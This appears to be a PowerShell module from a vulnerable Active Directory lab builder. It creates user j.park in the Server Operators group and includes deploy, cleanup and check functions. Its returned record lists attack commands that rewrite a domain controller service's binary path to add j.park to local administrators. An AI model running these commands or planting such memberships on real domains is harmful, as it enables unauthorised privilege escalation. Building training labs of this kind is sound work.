#Requires -Modules ActiveDirectory
<#
.SYNOPSIS
    Deploys Server Operators service abuse scenario.
.DESCRIPTION
    Creates a user in the Server Operators group capable of managing services on Domain Controllers.
#>

function Deploy-ServerOperators {
    [CmdletBinding()]
    param(
        [string]$Difficulty = 'Medium',
        [string]$DomainDN,
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying Server Operators Scenario..." -Type Info

    $password = Get-VulnPassword -Difficulty $Difficulty -Index 13
    $user = New-VulnUser -SamAccountName 'j.park' -Name 'James Park' -Password $password -DomainDN $DomainDN -Description 'Systems Administrator'

    try {
        Add-ADGroupMember -Identity 'Server Operators' -Members 'j.park' -ErrorAction Stop
        Write-VulnStatus -Message "Added j.park to Server Operators group." -Type Success
    } catch {
        Write-VulnStatus -Message "Failed to add j.park to Server Operators: $_" -Type Warning
    }

    Write-VulnResult -Name 'Server Operators User' -Detail 'j.park added to Server Operators' -Success $true -IsLast

    return @{
        Scenario       = 'ServerOperators'
        Description    = 'User in Server Operators group with rights to stop/start/modify services on DC'
        CreatedObjects = @('j.park')
        AttackCommands = @(
            'sc.exe config <ServiceName> binpath= "cmd /c net localgroup administrators j.park /add"',
            'sc.exe stop <ServiceName> && sc.exe start <ServiceName>'
        )
        AttackPath     = 'j.park (Server Operators) -> Modify DC Service Binary Path -> SYSTEM / Local Admin'
        MitreID        = 'T1543.003'
        Difficulty     = $Difficulty
    }
}

function Remove-ServerOperators {
    [CmdletBinding()]
    param([string]$DomainDN)

    try {
        Remove-ADGroupMember -Identity 'Server Operators' -Members 'j.park' -Confirm:$false -ErrorAction SilentlyContinue
        Remove-ADUser -Identity 'j.park' -Confirm:$false -ErrorAction SilentlyContinue
        Write-VulnStatus -Message "Removed Server Operators scenario objects." -Type Success
    } catch {
        Write-VulnStatus -Message "Cleanup error: $_" -Type Warning
    }
}

function Test-ServerOperators {
    [CmdletBinding()]
    param([string]$DomainDN)

    $u = Get-ADUser -Filter "samAccountName -eq 'j.park'" -ErrorAction SilentlyContinue
    if ($u) {
        $groups = Get-ADPrincipalGroupMembership -Identity 'j.park' | Select-Object -ExpandProperty Name
        return ('Server Operators' -in $groups)
    }
    return $false
}
